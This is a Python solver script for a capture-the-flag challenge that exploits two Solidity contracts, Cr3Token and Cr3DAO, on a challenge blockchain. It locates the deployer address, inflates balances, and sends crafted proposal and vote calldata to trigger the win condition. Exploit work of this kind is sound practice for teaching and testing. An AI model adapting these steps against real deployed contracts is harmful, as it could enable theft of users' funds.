#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pathlib import Path

from ctf_solvers.pwn_solver import PwnChallengeSolver
from ctf_solvers.types import ChallengeInstanceInfo

from cheb3 import Connection
from cheb3.utils import compile_file, encode_with_signature
from cheb3.account import logger
import warnings


logger.remove()
warnings.filterwarnings('ignore')  # UnexpectedVersionWarning


class Solver(PwnChallengeSolver):
    def _solve(self, data: ChallengeInstanceInfo):
        conn = Connection(data['http_endpoint'])
        acc = conn.account(data['private_key'])

        contracts = compile_file(str(Path(__file__).parent / 'single.sol'), solc_version='0.8.10')
        cr3_token_abi, cr3_token_bytecode = contracts['Cr3Token']
        cr3_dao_abi, cr3_dao_bytecode = contracts['Cr3DAO']

        cr3_token = conn.contract(signer=acc, address=data['contracts']['Cr3Token'],
                                  abi=cr3_token_abi, bytecode=cr3_token_bytecode)
        cr3_dao = conn.contract(signer=acc, address=data['contracts']['Cr3DAO'],
                                abi=cr3_dao_abi, bytecode=cr3_dao_bytecode)

        if cr3_token.functions.isSolved().call():
            return

        deployer_address = ''
        for i in range(15):
            if len(deployer_address) > 0:
                break

            try:
                block = conn.w3.eth.get_block(i, full_transactions=True)
            except:  # noqa
                break

            for transaction in block['transactions']:
                deployer_address = transaction['from']
                break

        for i in range(5):
            cr3_token.functions.setBalanceoF(i, deployer_address, 1337000000000000000000).send_transaction()

        for i in range(4):
            cr3_dao.functions.createProposal('Cr3').send_transaction()

        fsdata = encode_with_signature('getBalanceoF(uint,address)', 4, deployer_address)
        cr3_dao.functions.vote(4, fsdata).send_transaction()

        cr3_dao.functions.executeProposal(4, deployer_address, 1337).send_transaction()
        cr3_dao.functions.coolCheck(2, 63, acc.address).send_transaction()


Solver().start()
